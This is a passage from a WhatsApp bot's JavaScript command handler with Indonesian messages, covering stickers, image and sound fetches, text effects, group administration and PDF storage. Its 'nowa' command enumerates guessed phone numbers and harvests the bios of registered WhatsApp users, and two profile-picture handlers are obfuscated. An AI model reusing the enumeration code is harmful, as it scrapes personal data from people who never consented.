break
//=================================================//
case  'qcstick':{
if (isBan) return m.reply('*Lu Di Ban Owner*')
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return m.reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
const username = await haikal.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await haikal.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
type: "quote",
format: "png",
backgroundColor: "#FFFFFF",
width: 700,
height: 580,
scale: 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": username,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
let encmedia = await haikal.sendImageAsSticker(m.chat, buffer, m, { packname: global.packname, 
author: global.author, 
categories: ['🤩', '🎉'],
id: '12345',
quality: 100,
background: 'transparent'})
await fs.unlinkSync(encmedia)
})
}
break 
//=================================================
case 'art':
case 'awoo':
case 'bts':
case 'cogan':
case 'elaina':
case 'exo':
case 'elf':
case 'estetic':
case 'kanna':
case 'loli':
case 'neko2':
case 'waifu':
case 'shota':
case 'husbu':
case 'sagiri':
case 'shinobu':
case 'megumin':
case 'wallnime':
case 'quotesimage':
haikal.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}` } })
break
//=================================================//
case 'neko' :
if (isBan) return m.reply('*Lu Di Ban Owner*')
waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
haikal.sendMessage(from, {image: {url:waifudd.data.url},caption:`Ah Sayang 🥺🥺`},{ quoted : hw }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'waifu' :
if (isBan) return m.reply('*Lu Di Ban Owner*')
waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
haikal.sendMessage(from, {image: {url:waifudd.data.url},caption:`Ahh Sayang 🥺🙏`}, { quoted : hw }).catch(err => {
 return('Error!')
})
break       
case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
haikal.sendImage(from, data.url, 'Success Coy', m)
})
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikalgans = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await haikal.sendMessage(from, { audio: haikalgans, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6281214281312',
title: `ZENN MODS WA`,
sourceUrl: `https://wa.me/6281214281312`, 
thumbnail: thumb
}
}})
break
//=================================================//
   case 'group': case 'grup': {   
   if (!isCreator) return m.reply(`*khusus Premium*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (args[0] === 'close'){
await haikal.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await haikal.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
haikal.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Group Open
Group Close`}, {quoted : hw}) 
 }
}
break
//=================================================//
case 'editinfo': {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
 if (args[0] === 'open'){
await haikal.groupSettingUpdate(from, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await haikal.groupSettingUpdate(from, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else {
 haikal.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Editinfo Open
Editinfo Close`}, {quoted : hw}) 

}
}
break
//=================================================//
case 'join': {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
m.reply('*Sabar Cuy Loading*')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await haikal.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setppbot': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
m.reply('*Sabar Cuy Loading*')
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
var _0x1c413d=_0x2a1c;(function(_0x477de5,_0x25404c){var _0xc6ef35=_0x2a1c,_0x1a86a3=_0x477de5();while(!![]){try{var _0x392e78=parseInt(_0xc6ef35(0xff))/0x1+-parseInt(_0xc6ef35(0xfc))/0x2+-parseInt(_0xc6ef35(0xf9))/0x3*(parseInt(_0xc6ef35(0xfe))/0x4)+parseInt(_0xc6ef35(0x103))/0x5*(parseInt(_0xc6ef35(0x100))/0x6)+parseInt(_0xc6ef35(0x105))/0x7+parseInt(_0xc6ef35(0x108))/0x8+-parseInt(_0xc6ef35(0x102))/0x9*(parseInt(_0xc6ef35(0xfd))/0xa);if(_0x392e78===_0x25404c)break;else _0x1a86a3['push'](_0x1a86a3['shift']());}catch(_0x4aa4a8){_0x1a86a3['push'](_0x1a86a3['shift']());}}}(_0x512f,0x3121c));var media=await haikal[_0x1c413d(0x10a)](quoted);function _0x2a1c(_0x26455a,_0x1953ac){var _0x512fee=_0x512f();return _0x2a1c=function(_0x2a1c5a,_0x267fa3){_0x2a1c5a=_0x2a1c5a-0xf8;var _0xfaa61b=_0x512fee[_0x2a1c5a];return _0xfaa61b;},_0x2a1c(_0x26455a,_0x1953ac);}try{if(args[0x0]==_0x1c413d(0xfa)){const {generateProfilePicture}=require('./baseikal/lib/myfunc');var {img}=await generateProfilePicture(media);await haikal[_0x1c413d(0x106)]({'tag':'iq','attrs':{'to':botNumber,'type':'set','xmlns':_0x1c413d(0x107)},'content':[{'tag':_0x1c413d(0xf8),'attrs':{'type':_0x1c413d(0xfb)},'content':img}]});}else await haikal[_0x1c413d(0x101)](botNumber,{'url':media});m['reply'](mess[_0x1c413d(0x109)]);}catch{m[_0x1c413d(0x104)]('Gagal\x20Mengganti\x20Photo\x20Profile');}function _0x512f(){var _0x2f232f=['reply','1286194bdHKgR','query','w:profile:picture','3088072VzwWid','success','downloadAndSaveMediaMessage','picture','153igiZJi','/full','image','720650VaxDBN','2205790rCEybd','5796etOiDI','80334lizMjF','6GdpecB','updateProfilePicture','9DZAUSC','1029810dkCbDi'];_0x512f=function(){return _0x2f232f;};return _0x512f();}
}
break
//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
m.reply('*Sabar Cuy Loading*')
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
const _0x3c52ee=_0x4109;(function(_0x1a4f9f,_0x3819cc){const _0x5c4a67=_0x4109,_0x4d0e21=_0x1a4f9f();while(!![]){try{const _0x2fe536=-parseInt(_0x5c4a67(0x78))/0x1+parseInt(_0x5c4a67(0x7a))/0x2*(-parseInt(_0x5c4a67(0x7e))/0x3)+parseInt(_0x5c4a67(0x73))/0x4+parseInt(_0x5c4a67(0x7c))/0x5+-parseInt(_0x5c4a67(0x72))/0x6+parseInt(_0x5c4a67(0x76))/0x7+parseInt(_0x5c4a67(0x70))/0x8;if(_0x2fe536===_0x3819cc)break;else _0x4d0e21['push'](_0x4d0e21['shift']());}catch(_0x3ccaac){_0x4d0e21['push'](_0x4d0e21['shift']());}}}(_0x38ce,0x9724c));function _0x4109(_0x2b2147,_0x340f6c){const _0x38ce6f=_0x38ce();return _0x4109=function(_0x410966,_0x2335d5){_0x410966=_0x410966-0x6d;let _0xbe9a92=_0x38ce6f[_0x410966];return _0xbe9a92;},_0x4109(_0x2b2147,_0x340f6c);}let media=await haikal['downloadAndSaveMediaMessage'](quoted);function _0x38ce(){const _0x2fbc7e=['43773HHkTHV','w:profile:picture','./baseikal/lib/myfunc','chat','10418328MFCmiM','reply','6441450CkyNxQ','1458440XVIgpe','set','picture','4984819pxHUxY','/full','786695iyptWU','query','142qiVRKp','image','5681485dynfLf','Gagal\x20Mengganti\x20Photo\x20Profile'];_0x38ce=function(){return _0x2fbc7e;};return _0x38ce();}try{if(args[0x0]==_0x3c52ee(0x77)){const {generateProfilePicture}=require(_0x3c52ee(0x6e));var {img}=await generateProfilePicture(media);await haikal[_0x3c52ee(0x79)]({'tag':'iq','attrs':{'to':m[_0x3c52ee(0x6f)],'type':_0x3c52ee(0x74),'xmlns':_0x3c52ee(0x6d)},'content':[{'tag':_0x3c52ee(0x75),'attrs':{'type':_0x3c52ee(0x7b)},'content':img}]});}else await haikal['updateProfilePicture'](m[_0x3c52ee(0x6f)],{'url':media});m[_0x3c52ee(0x71)](mess['success']);}catch{m['reply'](_0x3c52ee(0x7d));}
}
break
//=================================================//
case 'block': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setname': case 'setsubject': {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text ?'
await haikal.groupUpdateSubject(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setdesc': case 'setdesk': {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text Nya ?'
await haikal.groupUpdateDescription(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break
case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass':
case 'papercut': 
case 'watercolor':
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
 case 'snow': 
 case 'cloud': 
 case 'honey': 
 case 'ice': 
 case 'fruitjuice': 
 case 'biscuit': 
 case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
 case 'firework': 
 case 'skeleton': 
 case 'blackpink': 
 case 'sand': 
 case 'glue': 
 case '1917': 
 case 'leaves': {
 if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) return m.reply(`Contoh : ${prefix + command} ${botname}`) 
m.reply('*Sabar Cuy Loading*')
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await maker.textpro(link, q)
haikal.sendMessage(from, { image: { url: anu }, caption: `*© Created By ${botname}*` }, {quoted : hw})
}
break
//=================================================//
case 'transformer': case 'fomer': case 'trans':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if(!text) return m.reply(`Penggunaan ${command} teks`)
 m.reply('*Sabar Cuy Loading*')
 maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
`${text}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted : hw}))
.catch((err) => console.log(err));
break
//=================================================//
case 'herryp': case 'potter': case 'heryy':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if(!text) return m.reply(`Penggunaan ${command} teks|teks`)
m.reply('*Sabar Cuy Loading*')
teks1 = text.split("|")[0]
teks2 = text.split("|")[1]
maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
 `${teks1}`,`${teks2}`])
 .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted : hw}))
 .catch((err) => console.log(err));
break
//=================================================//
case 'neondevil': case 'neon': case 'devil':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if(!text) return m.reply(`Penggunaan ${command} teks`)
 m.reply('*Sabar Cuy Loading*')
 maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
`${text}`,])
 .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted : hw}))
 .catch((err) => console.log(err));
break
//=================================================//
case '3dstone': case 'stone':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if(!text) return m.reply(`Penggunaan ${command} teks`)
m.reply('*Sabar Cuy Loading*')
maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
 `${text}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted : hw}))
.catch((err) => console.log(err));
break
//=================================================//
case 'thunder': case 'thun':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if(!text) return m.reply(`Penggunaan ${command} teks`)
m.reply('*Sabar Cuy Loading*')
maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
 `${text}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted : hw}))
.catch((err) => console.log(err));
break
//=================================================//
case 'graf':
case 'graffiti':
case 'grafiti':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if(!text) return m.reply(`Penggunaan ${command} teks|teks`)
m.reply('*Sabar Cuy Loading*')
teks1 = text.split("|")[0]
teks2 = text.split("|")[1]
maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
 `${teks1}`,`${teks2}`])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted : hw}))
.catch((err) => console.log(err));
break
//=================================================//
case 'glitch3':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if(!text) return m.reply(`Penggunaan ${command} teks|teks`)
m.reply('*Sabar Cuy Loading*')
teks1 = text.split("|")[0]
teks2 = text.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
 `${teks1}`,`${teks2}`])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted : hw}))
.catch((err) => console.log(err));
break
//=================================================//
case '3dbox':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if(!text) return m.reply(`Penggunaan ${command} teks`)
m.reply('*Sabar Cuy Loading*')
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
 `${text}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted : hw}))
.catch((err) => console.log(err));
break
//=================================================//
case 'drapwater': case 'water':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if(!text) return m.reply(`Penggunaan ${command} teks`)
m.reply('*Sabar Cuy Loading*')
 maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
`${text}`,])
 .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted : hw}))
 .catch((err) => console.log(err));
break
//=================================================//
case 'lion2': case 'lionn':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if(!text) return m.reply(`Penggunaan ${command} teks`)
m.reply('*Sabar Cuy Loading*')
maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
 `${text}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted : hw}))
.catch((err) => console.log(err));
break
//=================================================//
case 'papercut': case 'paper': case 'cute':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if(!text) return m.reply(`Penggunaan ${command} teks`)
 m.reply('*Sabar Cuy Loading*')
 maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [
`${text}`,])
 .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted : hw}))
 .catch((err) => console.log(err));
break
case 'bagaimanakah':
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (!text) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${text}\nJawaban : ${ya}` }, {quoted : hw})
break
//=================================================//
 case 'apakah':
 if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
haikal.sendMessage(from, { text: `Pertanyaan : Apakah ${text}\nJawaban : ${kah}` }, {quoted : hw})
break
//=================================================//
case 'nowa': {
if (!isCreator) return
if (!args[0]) return m.reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return m.reply('lah?')
m.reply('*Sabar Cuy Loading*')
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await haikal.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await haikal.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio = `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny = `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap = `${nomer0}${i}${nomer1}\n`
}
}
m.reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
//=================================================//
case 'addpdf':{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (args.length < 1) return reply('Nama pdf apa')
let teks = `${text}`
{
if (docunye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await haikal.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./database/Docu/${teks}.pdf`)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Pdf\nCek dengan cara ${prefix}listpdf`)
}
}
break
//=================================================//
case 'delpdf':{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (args.length < 1) return reply('Masukan query')
let teks = `${text}`
{
if (!docunye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = docunye.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
